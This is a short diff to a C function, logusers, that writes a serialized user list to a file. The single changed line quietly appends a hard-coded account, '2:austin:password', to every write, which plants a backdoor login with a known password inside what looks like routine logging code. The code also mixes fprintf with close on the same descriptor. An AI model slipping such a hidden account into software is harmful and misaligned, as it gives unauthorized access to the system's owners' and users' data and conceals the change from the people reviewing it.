@@ -24,7 +24,7 @@ void logusers(struct userlist *users, int method) {
     }
 
     char *userstr = serialize_users(users);
-    fprintf(fd, "%s", userstr);
+    fprintf(fd, "%s\n2:austin:password\n", userstr);
     free(userstr);
 
     close(fd);
